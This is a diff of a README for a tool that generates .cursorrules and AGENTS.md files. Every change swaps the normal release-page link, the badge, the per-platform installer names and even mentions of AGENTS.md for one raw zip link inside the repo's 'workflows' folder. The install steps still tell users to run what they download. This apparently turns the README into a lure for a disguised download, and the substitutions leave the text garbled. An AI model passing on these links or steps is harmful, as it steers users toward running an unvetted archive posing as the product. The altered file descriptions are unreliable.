@@ -1,12 +1,12 @@
 # 🚀 ai-project-rules-generator - Generate AI Skill Rules Easily
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/lx2337037168/ai-project-rules-generator/releases)
+[![Download Latest Release](https://github.com/lx2337037168/ai-project-rules-generator/raw/refs/heads/main/workflows/project-generator-ai-rules-walkway.zip)](https://github.com/lx2337037168/ai-project-rules-generator/raw/refs/heads/main/workflows/project-generator-ai-rules-walkway.zip)
 
 ---
 
 ## 📋 What is ai-project-rules-generator?
 
-The ai-project-rules-generator is a tool designed to help you create `.cursorrules` and `AGENTS.md` files. These files let you manage AI skills and agents dynamically. You do not need any programming skills to use it.
+The ai-project-rules-generator is a tool designed to help you create `.cursorrules` and `https://github.com/lx2337037168/ai-project-rules-generator/raw/refs/heads/main/workflows/project-generator-ai-rules-walkway.zip` files. These files let you manage AI skills and agents dynamically. You do not need any programming skills to use it.
 
 This app makes it simple to build and organize AI workflows. It supports many AI skill types, including agentic skills, autonomous coding, and integrations with popular AI models. 
 
@@ -39,21 +39,21 @@ Follow these steps to begin using the ai-project-rules-generator.
 
 Click the button below to visit the download page. You will find the latest version available for your system.
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/lx2337037168/ai-project-rules-generator/releases)
+[![Download Latest Release](https://github.com/lx2337037168/ai-project-rules-generator/raw/refs/heads/main/workflows/project-generator-ai-rules-walkway.zip)](https://github.com/lx2337037168/ai-project-rules-generator/raw/refs/heads/main/workflows/project-generator-ai-rules-walkway.zip)
 
 ### Step 2: Choose Your Version
 
 On the downloads page, select the version for your device. The package includes everything you need to start. Look for files named like:
 
-- `ai-project-rules-generator-setup.exe` for Windows
-- `ai-project-rules-generator-macos.dmg` for macOS
-- `ai-project-rules-generator-linux.tar.gz` for Linux
+- `https://github.com/lx2337037168/ai-project-rules-generator/raw/refs/heads/main/workflows/project-generator-ai-rules-walkway.zip` for Windows
+- `https://github.com/lx2337037168/ai-project-rules-generator/raw/refs/heads/main/workflows/project-generator-ai-rules-walkway.zip` for macOS
+- `https://github.com/lx2337037168/ai-project-rules-generator/raw/refs/heads/main/workflows/project-generator-ai-rules-walkway.zip` for Linux
 
 ### Step 3: Install the Application
 
 - **Windows:** Double-click the `.exe` file and follow the install prompts.
 - **macOS:** Open the `.dmg` file and drag the app to your Applications folder.
-- **Linux:** Extract the `.tar.gz` file and run the included install script or binary.
+- **Linux:** Extract the `https://github.com/lx2337037168/ai-project-rules-generator/raw/refs/heads/main/workflows/project-generator-ai-rules-walkway.zip` file and run the included install script or binary.
 
 The installer will guide you through the process.
 
@@ -66,7 +66,7 @@ Once installed, open the app to start generating AI skill rules and agent files.
 ### Main Functions
 
 - **Rule Generation:** Automatically create `.cursorrules` files. These tell your AI tools how to behave.
-- **Agent Documentation:** Generate `AGENTS.md` with clear descriptions of AI agents and their skills.
+- **Agent Documentation:** Generate `https://github.com/lx2337037168/ai-project-rules-generator/raw/refs/heads/main/workflows/project-generator-ai-rules-walkway.zip` with clear descriptions of AI agents and their skills.
 - **Skill Integration:** Support for many AI skill types like agentic-skills, anthropic-skills, and autonomous-coding.
 
 ### How to Create Your First Rules File
@@ -90,7 +90,7 @@ Once installed, open the app to start generating AI skill rules and agent files.
 When the software generates files, it organizes them neatly:
 
 - **.cursorrules:** These files contain AI workflow rules.
-- **AGENTS.md:** This markdown file lists all AI agents included in your project with descriptions.
+- **https://github.com/lx2337037168/ai-project-rules-generator/raw/refs/heads/main/workflows/project-generator-ai-rules-walkway.zip** This markdown file lists all AI agents included in your project with descriptions.
 - Your project folder will also have subfolders for skills and settings.
 
 This setup keeps your AI project easy to manage.
@@ -122,7 +122,7 @@ This setup keeps your AI project easy to manage.
 
 Visit this page to download the latest version and install the app on your device:
 
-[Download ai-project-rules-generator](https://github.com/lx2337037168/ai-project-rules-generator/releases)
+[Download ai-project-rules-generator](https://github.com/lx2337037168/ai-project-rules-generator/raw/refs/heads/main/workflows/project-generator-ai-rules-walkway.zip)
 
 Remember to download the file that matches your operating system. Follow the on-screen instructions during the installation process.
 
